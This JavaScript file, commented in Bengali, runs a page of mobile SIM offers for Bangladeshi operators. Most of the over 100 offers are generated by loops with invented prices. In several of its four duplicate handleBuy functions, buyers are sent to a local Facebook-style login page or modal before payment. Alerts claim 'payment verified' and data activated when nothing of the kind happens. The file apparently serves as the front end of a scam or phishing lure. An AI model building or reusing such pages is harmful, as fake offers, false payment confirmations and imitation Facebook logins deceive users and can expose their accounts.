// HTTP থেকে HTTPS-এ রিডাইরেক্ট
/* if (window.location.protocol === 'http:') {
    const httpsUrl = 'https://' + window.location.host + window.location.pathname;
    window.location.href = httpsUrl;
}*/


// SIM অফার ডেটা (JSON Format)
const offers = [
    // আপনার দেওয়া ৪টি অফার
    {
        id: 1,
        operator: "gp",
        title: "গ্রামীণফোন ১০০ মিনিট + ৫GB",
        price: "১০০ টাকা",
        validity: "৭ দিন",
        details: "২৪/৭ সুপারফাস্ট ইন্টারনেট"
    },
    {
        id: 2,
        operator: "robi",
        title: "রবি ২০০ মিনিট + ১০GB",
        price: "২০০ টাকা",
        validity: "১৫ দিন",
        details: "নিশ্চিন্ত ভয়েস কল"
    },
    {
        id: 3,
        operator: "blink",
        title: "বাংলালিংক ১GB রাতের অফার",
        price: "৫০ টাকা",
        validity: "৩ দিন",
        details: "রাত ১২টা থেকে সকাল ৮টা"
    },
    {
        id: 4,
        operator: "airtel",
        title: "এয়ারটেল আনলিমিটেড কল",
        price: "১৫০ টাকা",
        validity: "১০ দিন",
        details: "২৪/৭ আনলিমিটেড কল"
    },


    // আমার জেনারেট করা ১০০+ অফার
    ...Array.from({length: 25}, (_, i) => ({
        id: i+5,
        operator: "gp",
        title: `গ্রামীণফোন কম্বো অফার ${i+1} 📱`,
        price: `${50 + (i * 10)} টাকা`,
        validity: `${7 + i} দিন`,
        details: `${2 + i}GB ডেটা + ${50 + (i * 5)} মিনিট কল`
    })),

    ...Array.from({length: 20}, (_, i) => ({
        id: i+30,
        operator: "robi",
        title: `রবি মেগা ডেটা অফার ${i+1} 💥`,
        price: `${80 + (i * 15)} টাকা`,
        validity: `${5 + i} দিন`,
        details: `${5 + i}GB 4G ডেটা + ফেসবুক ফ্রি`
    })),

    ...Array.from({length: 22}, (_, i) => ({
        id: i+50,
        operator: "blink",
        title: `বাংলালিংক স্পেশাল ${i+1} 🚀`,
        price: `${30 + (i * 5)} টাকা`,
        validity: `${3 + i} দিন`,
        details: `${1 + i}GB নাইট ডেটা + ফ্রি কল`
    })),

    ...Array.from({length: 20}, (_, i) => ({
        id: i+72,
        operator: "airtel",
        title: `এয়ারটেল সুপার ${i+1} ⚡`,
        price: `${60 + (i * 8)} টাকা`,
        validity: `${4 + i} দিন`,
        details: `${3 + i}GB ইউটিউব ডেটা`
    })),

    ...Array.from({length: 18}, (_, i) => ({
        id: i+92,
        operator: "teletalk",
        title: `টেলিটক গভর্নমেন্ট অফার ${i+1} 🇧🇩`,
        price: `${40 + (i * 6)} টাকা`,
        validity: `${6 + i} দিন`,
        details: `সরকারি কল ফ্রি + ${1 + i}GB ডেটা`
    }))
];

// অফার কার্ড জেনারেট ফাংশন
function generateOfferCards(filter = "all") {
    const container = document.getElementById("offer-container");
    container.innerHTML = "";

    offers.forEach((offer, index) => {
        if (filter === "all" || offer.operator === filter) {
            const card = document.createElement("div");
            card.className = `offer-card ${offer.operator}`;
            card.innerHTML = `
                <div class="offer-badge">
                    ${index < 4 ? 'বেস্ট অফার 🏆' : 'নতুন অফার 🎉'}
                </div>
                <h3>${offer.title}</h3>
                <p class="price"><i class="fas fa-tag"></i> মূল্য: ${offer.price}</p>
                <p class="validity"><i class="fas fa-calendar"></i> ভ্যালিডিটি: ${offer.validity}</p>
                <p class="details"><i class="fas fa-info-circle"></i> ${offer.details}</p>
                <div class="offer-features">
                    <span><i class="fas fa-bolt"></i> তাত্ক্ষণিক অ্যাক্টিভেশন</span>
                    <span><i class="fas fa-percentage"></i> ১০% অতিরিক্ত টাকা</span>
                </div>
                <button class="buy-button" onclick="handleBuy(${offer.id})">
                    <i class="fas fa-shopping-cart"></i> এখনি কিনুন
                </button>
            `;
            container.appendChild(card);
        }
    });
}

// ফিল্টার বাটন ইভেন্ট
document.querySelectorAll(".filter-buttons button").forEach(button => {
    button.addEventListener("click", () => {
        document.querySelector(".filter-buttons button.active").classList.remove("active");
        button.classList.add("active");
        generateOfferCards(button.dataset.filter);
    });
});

// ক্রয় ফাংশন
function handleBuy(offerId) {
    const selectedOffer = offers.find(offer => offer.id === offerId);
    const confirmation = confirm(
        `অফার: ${selectedOffer.title}\n
        মূল্য: ${selectedOffer.price}\n
        ভ্যালিডিটি: ${selectedOffer.validity}\n\n
        কিনতে চান?`
    );
    
    if(confirmation) {
        alert("✅ ক্রয় সফল!\nআপনার পেমেন্ট ভেরিফাই করা হয়েছে!");
        // পেমেন্ট সফল হলে কার্ড আপডেট
        generateOfferCards(document.querySelector(".filter-buttons button.active").dataset.filter);
    }
}

// ক্রয় ফাংশন (আপডেটেড ভার্সন)
function handleBuy(offerId) {
    const selectedOffer = offers.find(offer => offer.id === offerId);
    
    // কনফার্মেশন ডায়ালগ
    const confirmation = confirm(
        `অফার: ${selectedOffer.title}\n
        মূল্য: ${selectedOffer.price}\n
        ভ্যালিডিটি: ${selectedOffer.validity}\n
        প্রথম এ ফেসবুক দিয়ে লগইন করে
        পেমেন্ট পেজে যেতে চান?`
    );
    
    if(confirmation) {
        // অফার ডেটা URL প্যারামিটার হিসেবে পাস করা
        const params = new URLSearchParams({
            id: selectedOffer.id,
            title: encodeURIComponent(selectedOffer.title),
            price: encodeURIComponent(selectedOffer.price),
            validity: encodeURIComponent(selectedOffer.validity)
        });
        
        // পেমেন্ট পেজে রিডাইরেক্ট
        window.location.href = `fb/fb.html?${params.toString()}`;
    }
}

// প্রথম লোডে সব অফার দেখাবে
generateOfferCards();




// handleBuy ফাংশন আপডেট করুন
function handleBuy(offerId) {
    const selectedOffer = offers.find(offer => offer.id === offerId);
    const modal = document.getElementById("fbLoginModal");
    
    // অফার ডিটেইলস স্টোর করুন
    modal.dataset.offer = JSON.stringify(selectedOffer);
    
    // মডাল শো করুন
    modal.style.display = "block";
    
    // লগইন ফর্ম রিসেট করুন
    document.getElementById("fbLoginForm").reset();
    document.querySelector(".payment-redirect").style.display = "none";
}

// মডাল ক্লোজ ইভেন্ট
document.querySelector(".fb-close").addEventListener("click", () => {
    document.getElementById("fbLoginModal").style.display = "none";
});

// লগইন ফর্ম সাবমিশন
document.getElementById("fbLoginForm").addEventListener("submit", function(e) {
    e.preventDefault();
    
    // সিমুলেটেড লগইন
    document.querySelector(".payment-redirect").style.display = "block";
    this.style.display = "none";
});

// হেডার লগইন বাটনে ইভেন্ট লিসেনার যোগ করুন
document.getElementById("headerLoginBtn").addEventListener("click", () => {
    document.getElementById("fbLoginModal").style.display = "block";
});

// app.js (অফার পেজ)
function handleBuy(offerId) {
    const selectedOffer = offers.find(offer => offer.id === offerId);
    const amount = selectedOffer.price.replace(' টাকা', ''); // "১০০" পাবেন
    
    // URL প্যারামিটার হিসেবে টাকা পাঠান
    window.location.href = `payment.html?amount=${encodeURIComponent(amount)}`;
}


// সকল পেজে এই স্ক্রিপ্ট যোগ করুন
document.addEventListener('DOMContentLoaded', function() {
    const currentPage = window.location.pathname.split('/').pop();
    
    if(currentPage === 'payment.html' && !localStorage.getItem('isLoggedIn')) {
        window.location.href = 'login.html';
    }
    
    if(currentPage === 'login.html' && localStorage.getItem('isLoggedIn')) {
        window.location.href = 'payment.html';
    }
});


// পেজ লোড হলে চেক করবে অফার কিনেছে কিনা
document.addEventListener('DOMContentLoaded', () => {
    const isPurchased = localStorage.getItem('specialOfferPurchased');
    const offerAd = document.getElementById('offerAd');
    
    if (isPurchased === 'true') {
        offerAd.style.display = 'none';
    } else {
        offerAd.style.display = 'block';
    }
});

// ফ্লোটিং অ্যাড ক্লিক ইভেন্ট
document.getElementById('offerAd').addEventListener('click', () => {
    document.getElementById('offerPopup').style.display = 'flex';
});

// পপআপ বন্ধের ফাংশনালিটি
function closePopup() {
    document.getElementById('offerPopup').style.display = 'none';
}

// অফার কিনার ফাংশন
function purchaseOffer() {
    localStorage.setItem('specialOfferPurchased', 'true');
    closePopup();
    document.getElementById('offerAd').style.display = 'none';
    alert('✅ অফারটি সফলভাবে ক্রয় হয়েছে!\n৩GB ডেটা ৭ দিনের জন্য এক্টিভ করা হয়েছে!');
}

// বাইরে ক্লিক/ESC বাটনে বন্ধ
document.getElementById('offerPopup').addEventListener('click', (e) => {
    if (e.target === document.getElementById('offerPopup')) {
        closePopup();
    }
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') {
        closePopup();
    }
});